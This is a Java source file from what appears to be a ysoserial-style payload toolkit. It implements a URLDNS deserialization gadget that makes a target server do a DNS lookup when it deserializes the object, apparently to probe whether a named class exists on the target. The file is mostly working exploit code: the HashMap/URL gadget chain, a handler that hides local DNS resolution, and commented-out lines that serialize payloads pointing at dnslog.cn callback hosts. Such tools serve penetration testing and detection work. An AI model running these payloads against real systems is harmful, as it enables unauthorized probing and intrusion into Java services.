package me.gv7.woodpecker.yso.payloads;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;
import sun.jvm.hotspot.memory.CMSBitMap;

import java.io.*;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Map;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.NOPOINT,Authors.C0NY1 })
public class URLDNSFindClass implements ObjectPayload<Object> {

        public Object getObject(final String command) throws Exception {

            String[] cmds = command.split("\\|");

            if(cmds.length != 2){
                System.out.println("<url>|<class name>");
                return null;
            }

            String url = cmds[0];
            String clazzName = cmds[1];

            URLStreamHandler handler = new SilentURLStreamHandler();
            HashMap ht = new HashMap();
            URL u = new URL(null, url, handler);
            ht.put(u, makeClass(clazzName));
            Reflections.setFieldValue(u, "hashCode", -1);
            return ht;
        }


    public static Class makeClass(String clazzName) throws CannotCompileException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        return ctClass.toClass();
    }

    /**
     * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
     * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
     * using the serialized object.</p>
     *
     * <b>Potential false negative:</b>
     * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
     * second resolution.</p>
     */
    static class SilentURLStreamHandler extends URLStreamHandler {

            protected URLConnection openConnection(URL u) throws IOException {
                    return null;
            }

            protected synchronized InetAddress getHostAddress(URL u) {
                    return null;
            }
    }


    public static void main(final String[] args) throws Exception {
        //PayloadRunner.run(URLDNS1.class, args);
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
//            objectOutputStream.writeObject(new URLDNS1().getObject("http://a44444.e5qn3w.dnslog.cn"));
//            objectOutputStream.close();

//            Map<Object,Object> linkedList = new HashMap<Object, Object>();
//            Object url = new URLDNS1().getObject("http://wee11111.up3n9z.dnslog.cn");
//            linkedList.put(makeClass("Okkkkkkkk"),url);
//
//
//            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
//            objectOutputStream.writeObject(linkedList);
//            objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("transformer.ser"));
        objectInputStream.readObject();
    }
}
